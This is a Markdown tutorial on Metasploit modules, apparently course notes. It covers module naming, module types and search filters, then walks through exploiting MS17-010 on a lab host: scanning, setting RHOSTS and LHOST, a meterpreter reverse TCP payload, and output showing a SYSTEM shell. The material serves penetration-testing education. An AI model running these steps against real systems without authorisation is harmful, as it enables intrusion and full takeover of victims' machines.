# 🧩 What are Metasploit Modules?

![Image](https://www.cs.toronto.edu/~arnold/427/15s/csc427/tools/metasploit/architecture.png)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/metasploit-guide-set-up.png?hsLang=en)

![Image](https://cdn.prod.website-files.com/5efc3ccdb72aaa7480ec8179/673c4139f7c9e8a1b4d9468a_61ede195222006f6c54b1f20_Metasploit%2520Framework%2520Architecture.png)

![Image](https://www.offsec.com/_astro/msfarch2_1bRFkI.webp)

**Metasploit modules** are **pre-written scripts** designed for a specific penetration testing task.

These scripts have already been:

- Developed
    
- Tested
    
- Used in real-world attacks
    

Many of them are **Proof-of-Concept (POC) exploits** that target known vulnerabilities.

⚠️ Important concept:

> If a Metasploit exploit fails, it does **NOT mean the vulnerability does not exist**.

Reasons why an exploit might fail:

- Wrong payload
    
- Incorrect target version
    
- Network restrictions
    
- Incorrect configuration
    
- Exploit requires customization
    

Therefore:

✔ Metasploit is a **support tool**  
❌ It is **not a substitute for manual pentesting skills**

---

# 📂 Metasploit Module Structure

Each module follows a structured naming format.

### Syntax

```text
<No.> <type>/<os>/<service>/<name>
```

### Example

```text
794 exploit/windows/ftp/scriptftp_list
```

---

# 🔢 Module Index Number (No.)

The **Index Number** appears during searches in msfconsole.

Example:

```text
0 exploit/windows/smb/ms17_010_psexec
```

This number allows quick selection of modules.

Example:

```bash
use 0
```

Instead of typing the full path.

---

# 🏷️ Module Type

The **Type** defines what the module does.

|Type|Description|
|---|---|
|Auxiliary|Scanning, fuzzing, sniffing, administrative tasks|
|Encoders|Ensure payload integrity during transmission|
|Exploits|Exploit vulnerabilities to deliver payloads|
|NOPs|Maintain payload size consistency|
|Payloads|Code executed on target system|
|Plugins|Additional scripts that extend functionality|
|Post|Post-exploitation activities|

---

### Interactable Modules

Only some module types can be used with the **`use` command**.

|Type|Purpose|
|---|---|
|Auxiliary|Scanning and enumeration|
|Exploits|Launch attacks|
|Post|Post-exploitation actions|

---

# 🖥️ OS Tag

The **OS tag** indicates the operating system the module targets.

Examples:

- `windows`
    
- `linux`
    
- `unix`
    
- `multi`
    

Different operating systems require **different exploit code**.

---

# 🔧 Service Tag

The **service tag** identifies the vulnerable service.

Examples:

- FTP
    
- SMB
    
- HTTP
    
- SSH
    

Example module:

```text
exploit/windows/smb/ms17_010_psexec
```

Target service = **SMB**

---

# 📝 Name Tag

The **Name tag** describes the actual exploit action.

Example:

```text
ms17_010_psexec
```

This indicates an exploit targeting the **MS17-010 vulnerability**.

---

# 🔎 Searching for Modules

Metasploit includes a powerful **search engine** to locate modules.

### Basic Command

```bash
search <keyword>
```

Example:

```bash
search eternalromance
```

---

# ⚙️ Search Command Help

```bash
msf6 > help search
```

Important options:

|Option|Description|
|---|---|
|-h|Show help|
|-o|Save output to CSV|
|-S|Regex filter|
|-s|Sort results|
|-r|Reverse results|

---

# 🔑 Search Keywords

Search can be refined using filters.

|Keyword|Description|
|---|---|
|cve|Search by CVE ID|
|author|Module author|
|arch|Target architecture|
|platform|Target OS|
|port|Target port|
|rank|Exploit reliability|
|type|Module type|
|name|Module name|

---

# 📌 Example Searches

### Search by CVE

```bash
search cve:2009 type:exploit
```

---

### Exclude Linux results

```bash
search cve:2009 type:exploit platform:-linux
```

---

### Sort results by name

```bash
search cve:2009 -s name
```

---

### Reverse sort

```bash
search type:exploit -s type -r
```

---

# 🎯 Example: Searching EternalRomance Exploit

```bash
msf6 > search eternalromance
```

Result:

```
0 exploit/windows/smb/ms17_010_psexec
1 auxiliary/admin/smb/ms17_010_command
```

Filter only exploit modules:

```bash
search eternalromance type:exploit
```

Result:

```
0 exploit/windows/smb/ms17_010_psexec
```

---

# 🔎 Advanced Search Example

Example search for:

- Windows exploits
    
- CVE from 2021
    
- Rank = excellent
    
- Microsoft related
    

```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Result example:

```
exploit/windows/http/exchange_proxylogon_rce
exploit/windows/http/exchange_proxyshell_rce
exploit/windows/http/sharepoint_unsafe_control
```

---

# 🛰️ Target Enumeration Example

Before exploitation, we perform **network scanning**.

Example using **Nmap**:

```bash
nmap -sV 10.10.10.40
```

Output:

```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios
445/tcp  open  microsoft-ds
```

Key discovery:

```
445/tcp open microsoft-ds
```

This indicates an **SMB service**.

---

# 🔎 Searching SMB Exploit

```bash
search ms17_010
```

Results:

```
0 exploit/windows/smb/ms17_010_eternalblue
1 exploit/windows/smb/ms17_010_psexec
2 auxiliary/admin/smb/ms17_010_command
3 auxiliary/scanner/smb/smb_ms17_010
```

---

# ⚙️ Selecting a Module

Use the module index number.

```bash
use 0
```

Example:

```bash
use exploit/windows/smb/ms17_010_psexec
```

---

# 🔧 Viewing Module Options

```bash
options
```

Required fields will display **Yes**.

Example:

|Option|Description|
|---|---|
|RHOSTS|Target IP address|
|RPORT|Target port|
|LHOST|Attacker IP|
|LPORT|Listening port|

---

# ℹ️ Module Information

To view detailed information:

```bash
info
```

Example output includes:

- Module name
    
- Author
    
- Target platform
    
- Exploit description
    
- CVE references
    
- Payload space
    
- Targets
    

Example exploit:

```
MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

---

# 🎯 Setting Target Host

To set the target IP:

```bash
set RHOSTS 10.10.10.40
```

Check options again:

```bash
options
```

---

# 🔒 Permanent Option Setting

Use **setg** to make settings global.

```bash
setg RHOSTS 10.10.10.40
```

Global settings remain until **msfconsole is restarted**.

---

# 🌐 Setting LHOST

When using reverse shell payloads, we must specify our attacker machine IP.

```bash
set LHOST 10.10.14.15
```

Example payload:

```
windows/meterpreter/reverse_tcp
```

---

# 🚀 Running the Exploit

Once options are configured:

```bash
run
```

or

```bash
exploit
```

Example output:

```
[*] Started reverse TCP handler on 10.10.14.15:4444
[+] Host is likely VULNERABLE to MS17-010
[*] Sending exploit packets
[+] Command shell session opened
```

---

# 💻 Accessing the Target System

After successful exploitation:

```
meterpreter >
```

To open shell:

```bash
shell
```

Example:

```
C:\Windows\system32>
```

---

# 🧠 Verifying Privileges

Check current user:

```bash
whoami
```

Example output:

```
nt authority\system
```

This means **full system access**.

---

# 📌 Key Takeaways

✔ Metasploit modules are **pre-built penetration testing scripts**  
✔ Modules follow the structure:

```
type/os/service/name
```

✔ Important module types:

- Auxiliary
    
- Exploit
    
- Payload
    
- Post
    

✔ Use `search` to locate modules  
✔ Use `use <number>` to select modules  
✔ Configure options using `set` or `setg`  
✔ Launch exploits using `run` or `exploit`

---

# 💡 Pentesting Tip

Always follow this workflow:

```
Enumeration → Vulnerability Research → Exploitation → Post Exploitation
```

Never rely only on Metasploit automation.

---

### Exercises


